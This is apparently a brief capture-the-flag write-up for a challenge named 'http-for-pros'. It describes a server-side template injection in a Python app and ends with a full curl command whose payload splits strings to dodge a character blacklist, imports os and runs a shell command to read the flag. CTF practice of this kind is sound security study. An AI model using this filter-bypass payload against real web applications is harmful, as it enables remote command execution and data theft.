Challenge name: http-for-pros
Description: You have all the hints you need... Get the flag!

We opened burpsuite and tried different payloads in order to get the flag. The vulnerability is a SSTI and the server is running on python.
Many chars are blacklisted like '.'. After a close analysis and a look on payloadsallthethings I found the exploit: curl -G "http://35.246.235.150:30463" \
>   --data-urlencode 'content={{request["appli"+"cation"][request.args.u*2+"globals"+request.args.u*2][request.args.u*2+"buil"+"tins"+request.args.u*2][request.args.u*2+"imp"+"ort"+request.args.u*2]("os")["po"+"pen"](request.args.f)["read"]()}}' \
>   --data-urlencode 'u=_' \
>   --data-urlencode 'f=cat flag'